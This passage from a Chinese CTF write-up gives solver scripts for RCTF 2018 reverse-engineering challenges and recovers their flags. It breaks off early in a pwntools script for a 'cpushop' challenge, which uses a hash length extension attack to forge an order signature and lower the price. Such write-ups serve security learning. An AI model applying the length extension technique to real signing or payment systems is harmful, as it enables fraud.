        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span><span class="o">--</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">base</span> <span class="o">=</span> <span class="n">val</span> <span class="o">/</span> <span class="mh">0x8B</span><span class="p">;</span>

    <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">base</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x8B</span><span class="p">;</span>
    <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span> <span class="o">^</span> <span class="n">val</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&gt;=</span> <span class="mh">0x20</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
        <span class="n">foo</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x8B</span><span class="p">;</span>
    <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span> <span class="o">^</span> <span class="n">val</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&gt;=</span> <span class="mh">0x20</span> <span class="o">&amp;&amp;</span> <span class="n">ch</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span><span class="p">;</span>
        <span class="n">foo</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">foo</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">13340610174042144018</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"done</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">foo</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">95741437967718225</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"done</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">foo</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">484886919005526</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"done</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<blockquote>
<p>_no_seAms<br/>
_NoR_nEe<br/>
Dlework</p>
</blockquote>
<p>flag: <strong>RCTF{Without_no_seAms_NoR_nEeDlework}</strong></p>
<h3 data-content="1" id="38d2b2da2440c0748dece13bd2490329"><strong>simple re</strong></h3>
<p>校验函数sub_401482.</p>
<p>穷举第一段24个字符:</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">aa</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">bb</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">cc</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">j</span><span class="p">;</span>
    <span class="kt">uint64_t</span> <span class="n">n</span><span class="p">,</span> <span class="n">m</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x556E4969</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x2E775361</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x893DAE7</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x96990423</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6CF9D3E9</span><span class="p">;</span>
    <span class="n">bb</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA505531F</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x54A0B9BD</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4B818640</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x8EB63387</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xA9EABEFD</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xB8CDF96B</span><span class="p">;</span>
    <span class="n">aa</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x113C3052</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">6</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">!=</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">n</span> <span class="o">=</span> <span class="n">j</span> <span class="o">*</span> <span class="mh">0x100000000</span><span class="p">;</span>
            <span class="n">n</span> <span class="o">+=</span> <span class="n">aa</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">%</span> <span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">cc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">n</span> <span class="o">/</span> <span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"cc[%d] == %08X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">cc</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cc</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">24</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<blockquote>
<p>cc[0] == 4D5F6F35<br/>
cc[1] == 5F796E40<br/>
cc[2] == 69376E61<br/>
cc[3] == 7665525F<br/>
cc[4] == 69737233<br/>
cc[5] == 545F676E<br/>
5o_M@ny_an7i_Rev3rsing_T</p>
</blockquote>
<p>穷举第二段8个字符:</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>

<span class="kt">uint32_t</span> <span class="nf">foo1</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// ST16_2</span>
    <span class="kt">uint16_t</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-18h]</span>
    <span class="kt">uint16_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-14h]</span>

    <span class="n">v5</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span> <span class="n">v5</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="n">v2</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">v2</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
        <span class="n">v5</span> <span class="o">^=</span> <span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">i</span> <span class="o">|</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">uint32_t</span> <span class="nf">foo2</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">y</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint32_t</span> <span class="n">yy</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-18h]</span>
    <span class="kt">uint64_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-10h]</span>
    <span class="kt">uint64_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-8h]</span>

    <span class="n">yy</span> <span class="o">=</span> <span class="n">y</span><span class="p">;</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="mi">1LL</span><span class="p">;</span>
    <span class="n">v5</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">yy</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">yy</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">v6</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">*</span> <span class="n">v6</span> <span class="o">%</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">v5</span> <span class="o">=</span> <span class="n">v5</span> <span class="o">*</span> <span class="n">v5</span> <span class="o">%</span> <span class="n">n</span><span class="p">;</span>
        <span class="n">yy</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i1</span><span class="p">,</span> <span class="n">i2</span><span class="p">,</span> <span class="n">i3</span><span class="p">,</span> <span class="n">i4</span><span class="p">,</span> <span class="n">i5</span><span class="p">,</span> <span class="n">i6</span><span class="p">,</span> <span class="n">i7</span><span class="p">,</span> <span class="n">i8</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">v</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">p1</span><span class="p">;</span>
    <span class="kt">uint16_t</span> <span class="o">*</span><span class="n">p2</span><span class="p">,</span> <span class="o">*</span><span class="n">p3</span><span class="p">;</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">p2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint16_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>
    <span class="n">p3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint16_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i1</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i1</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i1</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">i1</span><span class="p">;</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">i2</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i2</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i2</span><span class="o">++</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">buf</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">i2</span><span class="p">;</span>
            <span class="k">for</span> <span class="p">(</span><span class="n">i3</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i3</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i3</span><span class="o">++</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">i3</span><span class="p">;</span>
                <span class="k">for</span> <span class="p">(</span><span class="n">i4</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i4</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i4</span><span class="o">++</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="n">buf</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">i4</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">foo1</span><span class="p">(</span><span class="o">*</span><span class="n">p2</span><span class="p">,</span> <span class="o">*</span><span class="n">p3</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xA496</span><span class="p">)</span> <span class="c1">// -----</span>
                    <span class="p">{</span>
                        <span class="k">for</span> <span class="p">(</span><span class="n">i5</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i5</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i5</span><span class="o">++</span><span class="p">)</span>
                        <span class="p">{</span>
                            <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">i5</span><span class="p">;</span>
                            <span class="k">for</span> <span class="p">(</span><span class="n">i6</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i6</span><span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i6</span><span class="o">++</span><span class="p">)</span>
                            <span class="p">{</span>
                                <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">i6</span><span class="p">;</span>
                                <span class="k">for</span> <span class="p">(</span><span class="n">i7</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span> <span class="n">i7</span> <span class="o">&lt;</span> <span class="mh">0x7F</span><span class="p">;</span> <span class="n">i7</span><span class="o">++</span><span class="p">)</span>
                                <span class="p">{</span>
                                    <span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">i7</span><span class="p">;</span>
                                    <span class="c1">// -------- i8</span>
                                    <span class="n">buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                                    <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                                    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                                    <span class="p">{</span>
                                        <span class="n">v</span> <span class="o">^=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
                                    <span class="p">}</span>
                                    <span class="n">i8</span> <span class="o">=</span> <span class="mi">22</span> <span class="o">^</span> <span class="n">v</span><span class="p">;</span>
                                    <span class="k">if</span> <span class="p">(</span><span class="n">i8</span> <span class="o">&lt;</span> <span class="mh">0x7F</span> <span class="o">&amp;&amp;</span> <span class="n">i8</span> <span class="o">&gt;</span> <span class="mh">0x20</span><span class="p">)</span>
                                    <span class="p">{</span>
                                        <span class="n">buf</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">i8</span><span class="p">;</span>
                                        <span class="k">if</span> <span class="p">(</span><span class="n">foo2</span><span class="p">(</span><span class="o">*</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p2</span><span class="p">,</span> <span class="mh">0xF64BB17D</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x6F82C8DC</span><span class="p">)</span>
                                        <span class="p">{</span>
                                            <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
                                            <span class="p">{</span>
                                                <span class="n">printf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                                            <span class="p">}</span>
                                            <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                                        <span class="p">}</span>
                                    <span class="p">}</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<blockquote>
<p>echn!qu3</p>
</blockquote>
<p>第33个字符's'</p>
<p>flag: <strong>RCTF{5o_M@ny_an7i_Rev3rsing_Techn!qu3s}</strong></p>
<h3 data-content="1" id="a8d74b7d0f2a29662de7fb145c67351f"><strong>babyre2</strong></h3>
<div class="highlight"><pre><span></span><span class="kt">uint64_t</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span>

<span class="p">{</span>

<span class="mh">0x2B7192452905E8FB</span><span class="p">,</span>

<span class="mh">0x7BA58F82BD898035</span><span class="p">,</span>

<span class="mh">0xA3112746582E1434</span><span class="p">,</span>

<span class="mh">0x163F756FCC221AB0</span><span class="p">,</span>

<span class="mh">0xECC78E6FB9CBA1FE</span><span class="p">,</span>

<span class="mh">0xDCDD8B49EA5D7E14</span><span class="p">,</span>

<span class="mh">0xA2845FE0B3096F8E</span><span class="p">,</span>

<span class="mh">0xAAAAAAAAAA975D1C</span><span class="p">,</span>

<span class="p">};</span>

<span class="kt">uint64_t</span> <span class="n">mull</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span>

<span class="p">{</span>

<span class="mh">0x20656D6F636C6557</span><span class="p">,</span>

<span class="mh">0x2046544352206F74</span><span class="p">,</span>

<span class="mh">0x6548202138313032</span><span class="p">,</span>

<span class="mh">0x2061207369206572</span><span class="p">,</span>

<span class="mh">0x6320455279626142</span><span class="p">,</span>

<span class="mh">0x65676E656C6C6168</span><span class="p">,</span>

<span class="mh">0x756F7920726F6620</span><span class="p">,</span>

<span class="mh">0xFFFFFFFFFFFF002E</span><span class="p">,</span>

<span class="p">};</span>

<span class="kt">uint64_t</span> <span class="n">modd</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFC5</span><span class="p">;</span>

<span class="p">(</span><span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">mull</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="n">modd</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</pre></div>
<p>(A * mull) % modd = data 化成 A % modd = data*mull^(-1)</p>
<p>再A=data*mull^(-1) modd，然后上脚本</p>
<div class="highlight"><pre><span></span><span class="c1">#-*- coding:utf-8 -*-</span>
<span class="n">flag</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">def</span>     <span class="nf">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
        <span class="k">while</span> <span class="n">a</span><span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
            <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="o">%</span><span class="n">a</span><span class="p">,</span><span class="n">a</span>
        <span class="k">return</span> <span class="n">b</span>
<span class="c1">#定义一个函数，参数分别为a,n，返回值为b</span>
<span class="k">def</span>     <span class="nf">findModReverse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">m</span><span class="p">):</span><span class="c1">#这个扩展欧几里得算法求模逆</span>

        <span class="k">if</span> <span class="n">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">m</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="n">u1</span><span class="p">,</span><span class="n">u2</span><span class="p">,</span><span class="n">u3</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">a</span>
        <span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">,</span><span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">m</span>
        <span class="k">while</span> <span class="n">v3</span><span class="o">!=</span><span class="mi">0</span><span class="p">:</span>
            <span class="n">q</span> <span class="o">=</span> <span class="n">u3</span><span class="o">//</span><span class="n">v3</span>
            <span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">,</span><span class="n">v3</span><span class="p">,</span><span class="n">u1</span><span class="p">,</span><span class="n">u2</span><span class="p">,</span><span class="n">u3</span> <span class="o">=</span> <span class="p">(</span><span class="n">u1</span><span class="o">-</span><span class="n">q</span><span class="o">*</span><span class="n">v1</span><span class="p">),(</span><span class="n">u2</span><span class="o">-</span><span class="n">q</span><span class="o">*</span><span class="n">v2</span><span class="p">),(</span><span class="n">u3</span><span class="o">-</span><span class="n">q</span><span class="o">*</span><span class="n">v3</span><span class="p">),</span><span class="n">v1</span><span class="p">,</span><span class="n">v2</span><span class="p">,</span><span class="n">v3</span>
        <span class="k">return</span> <span class="n">u1</span><span class="o">%</span><span class="n">m</span>

<span class="k">print</span> <span class="n">findModReverse</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">11</span><span class="p">)</span>
<span class="n">d</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFFFFFFFC5</span>
<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x20656D6F636C6557</span><span class="p">,</span><span class="mh">0x2046544352206F74</span><span class="p">,</span><span class="mh">0x6548202138313032</span><span class="p">,</span><span class="mh">0x2061207369206572</span><span class="p">,</span><span class="mh">0x6320455279626142</span><span class="p">,</span><span class="mh">0x65676E656C6C6168</span><span class="p">,</span><span class="mh">0x756F7920726F6620</span><span class="p">,</span><span class="mh">0xFFFFFFFFFFFF002E</span><span class="p">]</span>
<span class="n">a_re</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
    <span class="n">num</span> <span class="o">=</span> <span class="n">findModReverse</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">d</span><span class="p">)</span>
    <span class="c1">#print hex(num)</span>
    <span class="n">a_re</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>


<span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x2B7192452905E8FB</span><span class="p">,</span><span class="mh">0x7BA58F82BD898035</span><span class="p">,</span><span class="mh">0xA3112746582E1434</span><span class="p">,</span><span class="mh">0x163F756FCC221AB0</span><span class="p">,</span><span class="mh">0xECC78E6FB9CBA1FE</span><span class="p">,</span><span class="mh">0xDCDD8B49EA5D7E14</span><span class="p">,</span><span class="mh">0xA2845FE0B3096F8E</span><span class="p">,</span><span class="mh">0xAAAAAAAAAA975D1C</span><span class="p">]</span>

<span class="c1">#for j in range(len(a)):</span>
<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
    <span class="c1">#print k</span>
    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="n">a_re</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">*</span> <span class="n">data</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">%</span> <span class="n">d</span>
    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">),</span><span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">num</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">print</span> <span class="n">flag</span>
</pre></div>
<h2 data-content="1" id="dc87dc807cfe15f33732fdd8cb68726e">0x04 Crypto</h2>
<h3 data-content="1" id="88e3b214bbbd32e1dabb33b802af6abf"><strong>cpushop</strong></h3>
<p>nc连接是个cpu商店，flag很贵买不起，支付时验证了order，order的sign由一个随机signkey和订单信息生成，可能存在哈希长度拓展攻击，通过修改价格买下flag<br/>
(打扰了，signkey的长度为random.randint(8,32))<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e81e518-5d65-1.png"/></p>
<p>通过哈希长度拓展攻击来修改订单价格<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180522100938-2e92d85a-5d65-1.png"/></p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">hashpumpy</span>

<span class="n">s</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">'cpushop.2018.teamrois.cn'</span><span class="p">,</span><span class="mi">43000</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Command:'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'1'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'Command:'</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">'2'</span><span class="p">)</span>
